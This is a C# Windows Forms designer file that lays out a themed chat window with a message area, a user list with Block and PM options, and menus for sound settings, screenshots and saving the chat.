namespace Net_Weave_R.Forms
{
    partial class Chat
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.carbonTheme1 = new CarbonTheme();
            this.panel1 = new System.Windows.Forms.Panel();
            this.txtChat = new System.Windows.Forms.RichTextBox();
            this.btnSend = new CarbonButton();
            this.txtMessage = new CarbonTextBox();
            this.lstUsers = new NetLib.Forms.xListview();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.menuUsers = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.blockToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.pMToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.menuStrip1 = new System.Windows.Forms.MenuStrip();
            this.optionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sendOnEnterToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.soundOnSentReceivedToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.connectDisconnectSoundToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.connectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.functionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.takeScreenshotToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.saveChatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.carbonTheme1.SuspendLayout();
            this.panel1.SuspendLayout();
            this.menuUsers.SuspendLayout();
            this.menuStrip1.SuspendLayout();
            this.SuspendLayout();
            // 
            // carbonTheme1
            // 
            this.carbonTheme1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(211)))), ((int)(((byte)(211)))), ((int)(((byte)(211)))));
            this.carbonTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.carbonTheme1.ControlBox = true;
            this.carbonTheme1.Controls.Add(this.panel1);
            this.carbonTheme1.Customization = "wMDA/8DAwP96enr/09PT/0ZGRv+Wlpb/AAAA/////27///8e////AAAAAP9WVlb/";
            this.carbonTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.carbonTheme1.DrawHatch = true;
            this.carbonTheme1.EnableExit = true;
            this.carbonTheme1.EnableMaximize = false;
            this.carbonTheme1.EnableMinimize = true;
            this.carbonTheme1.Font = new System.Drawing.Font("Verdana", 8F);
            this.carbonTheme1.Image = null;
            this.carbonTheme1.Location = new System.Drawing.Point(0, 0);
            this.carbonTheme1.Movable = true;
            this.carbonTheme1.Name = "carbonTheme1";
            this.carbonTheme1.NoRounding = false;
            this.carbonTheme1.Sizable = false;
            this.carbonTheme1.Size = new System.Drawing.Size(788, 541);
            this.carbonTheme1.SmartBounds = true;
            this.carbonTheme1.TabIndex = 0;
            this.carbonTheme1.Text = "Chat";
            this.carbonTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.carbonTheme1.Transparent = false;
            // 
            // panel1
            // 
            this.panel1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel1.Controls.Add(this.txtChat);
            this.panel1.Controls.Add(this.btnSend);
            this.panel1.Controls.Add(this.txtMessage);
            this.panel1.Controls.Add(this.lstUsers);
            this.panel1.Controls.Add(this.menuStrip1);
            this.panel1.Location = new System.Drawing.Point(12, 27);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(764, 502);
            this.panel1.TabIndex = 3;
            // 
            // txtChat
            // 
            this.txtChat.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.txtChat.Location = new System.Drawing.Point(3, 27);
            this.txtChat.Name = "txtChat";
            this.txtChat.ReadOnly = true;
            this.txtChat.Size = new System.Drawing.Size(636, 403);
            this.txtChat.TabIndex = 1;
            this.txtChat.Text = "";
            // 
            // btnSend
            // 
            this.btnSend.Customization = "gICA/6mpqf/T09P/////AICAgP+pqan/aWlp/9PT0//AwMD/AAAA/6mpqf8=";
            this.btnSend.Font = new System.Drawing.Font("Verdana", 8F);
            this.btnSend.Image = null;
            this.btnSend.Location = new System.Drawing.Point(645, 436);
            this.btnSend.Name = "btnSend";
            this.btnSend.NoRounding = false;
            this.btnSend.Size = new System.Drawing.Size(116, 63);
            this.btnSend.TabIndex = 4;
            this.btnSend.Text = "Send";
            this.btnSend.Transparent = false;
            this.btnSend.Click += new System.EventHandler(this.btnSend_Click);
            // 
            // txtMessage
            // 
            this.txtMessage.Customization = "AAAA/+Dg4P+pqan/qamp/////wD///8A";
            this.txtMessage.Font = new System.Drawing.Font("Verdana", 8F);
            this.txtMessage.Image = null;
            this.txtMessage.Location = new System.Drawing.Point(3, 436);
            this.txtMessage.MaxLength = 32767;
            this.txtMessage.Multiline = true;
            this.txtMessage.Name = "txtMessage";
            this.txtMessage.NoRounding = false;
            this.txtMessage.NumbersOnly = false;
            this.txtMessage.ReadOnly = false;
            this.txtMessage.Size = new System.Drawing.Size(636, 63);
            this.txtMessage.TabIndex = 3;
            this.txtMessage.Transparent = false;
            this.txtMessage.UseSystemPasswordChar = false;
            // 
            // lstUsers
            // 
            this.lstUsers.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1});
            this.lstUsers.ContextMenuStrip = this.menuUsers;
            this.lstUsers.FullRowSelect = true;
            this.lstUsers.Location = new System.Drawing.Point(645, 27);
            this.lstUsers.Name = "lstUsers";
            this.lstUsers.Size = new System.Drawing.Size(119, 403);
            this.lstUsers.TabIndex = 2;
            this.lstUsers.UseCompatibleStateImageBehavior = false;
            this.lstUsers.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "Online (0)";
            this.columnHeader1.Width = 95;
            // 
            // menuUsers
            // 
            this.menuUsers.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.blockToolStripMenuItem,
            this.pMToolStripMenuItem});
            this.menuUsers.Name = "menuUsers";
            this.menuUsers.Size = new System.Drawing.Size(104, 48);
            // 
            // blockToolStripMenuItem
            // 
            this.blockToolStripMenuItem.Name = "blockToolStripMenuItem";
            this.blockToolStripMenuItem.Size = new System.Drawing.Size(103, 22);
            this.blockToolStripMenuItem.Text = "Block";
            this.blockToolStripMenuItem.Click += new System.EventHandler(this.blockToolStripMenuItem_Click);
            // 
            // pMToolStripMenuItem
            // 
            this.pMToolStripMenuItem.Name = "pMToolStripMenuItem";
            this.pMToolStripMenuItem.Size = new System.Drawing.Size(103, 22);
            this.pMToolStripMenuItem.Text = "PM";
            this.pMToolStripMenuItem.Click += new System.EventHandler(this.pMToolStripMenuItem_Click);
            // 
            // menuStrip1
            // 
            this.menuStrip1.BackColor = System.Drawing.Color.Transparent;
            this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.optionsToolStripMenuItem,
            this.functionsToolStripMenuItem});
            this.menuStrip1.Location = new System.Drawing.Point(0, 0);
            this.menuStrip1.Name = "menuStrip1";
            this.menuStrip1.Size = new System.Drawing.Size(764, 24);
            this.menuStrip1.TabIndex = 0;
            this.menuStrip1.Text = "menuStrip1";
            // 
            // optionsToolStripMenuItem
            // 
            this.optionsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.sendOnEnterToolStripMenuItem,
            this.soundOnSentReceivedToolStripMenuItem,
            this.connectDisconnectSoundToolStripMenuItem});
            this.optionsToolStripMenuItem.Name = "optionsToolStripMenuItem";
            this.optionsToolStripMenuItem.Size = new System.Drawing.Size(61, 20);
            this.optionsToolStripMenuItem.Text = "Options";
            // 
            // sendOnEnterToolStripMenuItem
            // 
            this.sendOnEnterToolStripMenuItem.Checked = true;
            this.sendOnEnterToolStripMenuItem.CheckOnClick = true;
            this.sendOnEnterToolStripMenuItem.CheckState = System.Windows.Forms.CheckState.Checked;
            this.sendOnEnterToolStripMenuItem.Name = "sendOnEnterToolStripMenuItem";
            this.sendOnEnterToolStripMenuItem.Size = new System.Drawing.Size(220, 22);
            this.sendOnEnterToolStripMenuItem.Text = "Send on Enter";
            this.sendOnEnterToolStripMenuItem.Click += new System.EventHandler(this.sendOnEnterToolStripMenuItem_Click);
            // 
            // soundOnSentReceivedToolStripMenuItem
            // 
            this.soundOnSentReceivedToolStripMenuItem.Checked = true;
            this.soundOnSentReceivedToolStripMenuItem.CheckState = System.Windows.Forms.CheckState.Checked;
            this.soundOnSentReceivedToolStripMenuItem.Name = "soundOnSentReceivedToolStripMenuItem";
            this.soundOnSentReceivedToolStripMenuItem.Size = new System.Drawing.Size(220, 22);
            this.soundOnSentReceivedToolStripMenuItem.Text = "Sound on Sent\\Received";
            // 
            // connectDisconnectSoundToolStripMenuItem
            // 
            this.connectDisconnectSoundToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.connectToolStripMenuItem,
            this.disconnectToolStripMenuItem});
            this.connectDisconnectSoundToolStripMenuItem.Name = "connectDisconnectSoundToolStripMenuItem";
            this.connectDisconnectSoundToolStripMenuItem.Size = new System.Drawing.Size(220, 22);
            this.connectDisconnectSoundToolStripMenuItem.Text = "Connect\\Disconnect Sound";
            // 
            // connectToolStripMenuItem
            // 
            this.connectToolStripMenuItem.Checked = true;
            this.connectToolStripMenuItem.CheckOnClick = true;
            this.connectToolStripMenuItem.CheckState = System.Windows.Forms.CheckState.Checked;
            this.connectToolStripMenuItem.Name = "connectToolStripMenuItem";
            this.connectToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
            this.connectToolStripMenuItem.Text = "Connect";
            // 
            // disconnectToolStripMenuItem
            // 
            this.disconnectToolStripMenuItem.Checked = true;
            this.disconnectToolStripMenuItem.CheckOnClick = true;
            this.disconnectToolStripMenuItem.CheckState = System.Windows.Forms.CheckState.Checked;
            this.disconnectToolStripMenuItem.Name = "disconnectToolStripMenuItem";
            this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
            this.disconnectToolStripMenuItem.Text = "Disconnect";
            // 
            // functionsToolStripMenuItem
            // 
            this.functionsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.takeScreenshotToolStripMenuItem,
            this.saveChatToolStripMenuItem});
            this.functionsToolStripMenuItem.Name = "functionsToolStripMenuItem";
            this.functionsToolStripMenuItem.Size = new System.Drawing.Size(71, 20);
            this.functionsToolStripMenuItem.Text = "Functions";
            // 
            // takeScreenshotToolStripMenuItem
            // 
            this.takeScreenshotToolStripMenuItem.Name = "takeScreenshotToolStripMenuItem";
            this.takeScreenshotToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
            this.takeScreenshotToolStripMenuItem.Text = "Take Screenshot";
            this.takeScreenshotToolStripMenuItem.Click += new System.EventHandler(this.takeScreenshotToolStripMenuItem_Click);
            // 
            // saveChatToolStripMenuItem
            // 
            this.saveChatToolStripMenuItem.Name = "saveChatToolStripMenuItem";
            this.saveChatToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
            this.saveChatToolStripMenuItem.Text = "Save Chat";
            this.saveChatToolStripMenuItem.Click += new System.EventHandler(this.saveChatToolStripMenuItem_Click);
            // 
            // Chat
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(788, 541);
            this.Controls.Add(this.carbonTheme1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MainMenuStrip = this.menuStrip1;
            this.Name = "Chat";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Chat";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.carbonTheme1.ResumeLayout(false);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.menuUsers.ResumeLayout(false);
            this.menuStrip1.ResumeLayout(false);
            this.menuStrip1.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private CarbonTheme carbonTheme1;
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.MenuStrip menuStrip1;
        private System.Windows.Forms.ToolStripMenuItem optionsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem sendOnEnterToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem soundOnSentReceivedToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem functionsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem connectDisconnectSoundToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem connectToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem disconnectToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem takeScreenshotToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem saveChatToolStripMenuItem;
        private System.Windows.Forms.RichTextBox txtChat;
        private NetLib.Forms.xListview lstUsers;
        private System.Windows.Forms.ColumnHeader columnHeader1;
        private CarbonButton btnSend;
        private CarbonTextBox txtMessage;
        private System.Windows.Forms.ContextMenuStrip menuUsers;
        private System.Windows.Forms.ToolStripMenuItem blockToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem pMToolStripMenuItem;
    }
}